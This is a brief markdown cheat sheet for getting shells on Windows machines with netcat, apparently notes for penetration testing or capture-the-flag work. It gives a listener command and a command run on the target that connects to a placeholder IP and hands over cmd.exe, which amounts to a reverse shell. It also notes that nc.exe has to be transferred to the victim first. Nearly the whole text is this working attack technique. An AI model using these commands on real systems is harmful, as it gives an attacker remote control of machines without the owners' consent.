# Windows Shells

## Netcat

Will have to transfer a nc.exe binary to the Windows machine.

#### Listen

```bash
nc -lvnp 4444
```

#### Connect

```bash
nc <IP> 4444 -e cmd.exe
```
